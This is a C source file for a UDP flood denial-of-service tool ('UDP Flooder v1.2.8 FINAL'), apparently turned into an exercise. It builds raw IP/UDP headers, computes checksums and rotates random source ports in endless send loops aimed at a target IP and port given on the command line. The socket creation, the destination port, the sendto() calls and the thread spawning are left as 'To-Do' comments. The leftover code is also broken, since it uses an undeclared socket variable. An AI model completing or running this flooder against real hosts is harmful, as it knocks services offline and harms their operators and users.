#include <time.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
 
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
 
static uint32_t Q[4096], c = 362436;

struct thread_data{
        int pks;
        int throttle;
	int thread_id;
	unsigned int floodport;
	struct sockaddr_in sin;
};

struct iphdr
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ihl:4;
    unsigned int version:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int version:4;
    unsigned int ihl:4;
#else
# error        "Please fix <bits/endian.h>"
#endif
    u_int8_t tos;
    u_int16_t tot_len;
    u_int16_t id;
    u_int16_t frag_off;
    u_int8_t ttl;
    u_int8_t protocol;
    u_int16_t check;
    u_int32_t saddr;
    u_int32_t daddr;
    /*The options start here. */
  };
 
void init_rand(uint32_t x)
{
        int i;
 
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
 
        for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
 
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

char *myStrCat (char *s, char *a) {
    while (*s != '\0') s++;
    while (*a != '\0') *s++ = *a++;
    *s = '\0';
    return s;
}

char *replStr (char *str, size_t count) {
    if (count == 0) return NULL;
    char *ret = malloc (strlen (str) * count + count);
    if (ret == NULL) return NULL;
    *ret = '\0';
    char *tmp = myStrCat (ret, str);
    while (--count > 0) {
        tmp = myStrCat (tmp, str);
    }
    return ret;
}


/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
  sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}
void setup_ip_header(struct iphdr *iph)
{
  struct ifaddrs *ifaddr, *ifa;
           int family, s;
           char host[NI_MAXHOST];

           if (getifaddrs(&ifaddr) == -1) {
               perror("getifaddrs");
               exit(EXIT_FAILURE);
           }

           /* Walk through linked list, maintaining head pointer so we
              can free list later */

           for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
               if (ifa->ifa_addr == NULL)
                   continue;

               family = ifa->ifa_addr->sa_family;

               if (family == AF_INET) {
                   s = getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),
                           host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
                   if (s != 0) {
                       printf("getnameinfo() failed: %s\n", gai_strerror(s));
                       exit(EXIT_FAILURE);
                   }
                   if(strcmp(host, "127.0.0.1") != 0){
                       break;
                   }
               }
           }
           freeifaddrs(ifaddr);
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
  iph->id = htonl(54321);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;

  // Initial IP, changed later in infinite loop
  iph->saddr = inet_addr(host);
}

void setup_udp_header(struct udphdr *udph)
{
  udph->uh_sport = htons(5678);
  udph->uh_sum = 0;
}

void *flood(void *par1)
{
  struct thread_data *td = (struct thread_data *)par1;
  fprintf(stdout, "Thread %d started\n", td->thread_id);
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *ip_header = (struct iphdr *)datagram;
  struct udphdr *udp_header = (/*u_int8_t*/void *)ip_header + sizeof(struct iphdr);
  struct sockaddr_in sin = td->sin;
  char new_ip[sizeof "255.255.255.255"];

  /*To-Do: Create a socket s capable of sending not only UDP packets but raw data 
  including IP headers. Make sure to add error-checking  */
  //
  //

  unsigned int floodport = td->floodport;

  // Clear the data
  memset(datagram, 0, MAX_PACKET_SIZE);

  // Set appropriate fields in headers
  setup_ip_header(ip_header);
  setup_udp_header(udp_header);

  char *data = (char *)udp_header + sizeof(struct udphdr);
  data = replStr("\xFF", td->pks);
  udp_header->uh_ulen=htons(td->pks);

  ip_header->tot_len += td->pks;
   
  /* To-Do: Fill in the destination port in the UDP header. Make sure
  it is in network byte order */ 
  

  ip_header->daddr = sin.sin_addr.s_addr;
  ip_header->check = csum ((unsigned short *) datagram, ip_header->tot_len >> 1);

  int tmp = 1;
  const int *val = &tmp;
  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }

  int throttle = td->throttle;

  uint32_t random_num;
  uint32_t ul_dst;
  init_rand(time(NULL));
  if(throttle == 0){
    while(1){
      /* To-DO: Send the final network message through the socket using the sendto() function */
      //
      random_num = rand_cmwc();
      udp_header->uh_sport = htons(random_num & 0xFFFF);
      ip_header->check = csum ((unsigned short *) datagram, ip_header->tot_len >> 1);
    }
  } else {
    while(1){
      throttle = td->throttle;
      /* To-DO: Send the final network message through the socket using the sendto() function */
      //
      random_num = rand_cmwc();
      udp_header->uh_sport = htons(random_num & 0xFFFF);
      ip_header->check = csum ((unsigned short *) datagram, ip_header->tot_len >> 1);

     while(--throttle);
    }
  }
}
int main(int argc, char *argv[ ])
{
  if(argc < 6){
    fprintf(stderr, "Invalid parameters!\n");
    fprintf(stdout, "UDP Flooder v1.2.8 FINAL by ohnoes1479\nUsage: %s <target IP/hostname> <port to be flooded> <throttle (lower is faster)> <packet size> <number threads to use> <time (optional)>\n", argv[0]);
    exit(-1);
  }

  fprintf(stdout, "Setting up Sockets...\n");

  int num_threads = atoi(argv[5]);
  int packet_size = atoi(argv[4]);
  unsigned int floodport = atoi(argv[2]);
  pthread_t thread[num_threads];
  struct sockaddr_in sin;

  sin.sin_family = AF_INET;
  sin.sin_port = htons(floodport);
  sin.sin_addr.s_addr = inet_addr(argv[1]);

  struct thread_data td[num_threads];

  /*To-DO: Create enough separate threads until num_threads is reached,
  that execute the flood function. Make sure to fill in the thread_data struct 
  and use it as your pthread_t */
  //
  //
  //

  fprintf(stdout, "Starting Flood...\n");
  if(argc > 6)
  {
    sleep(atoi(argv[6]));
  } else {
    while(1){
      sleep(1);
    }
  }

  return 0;
}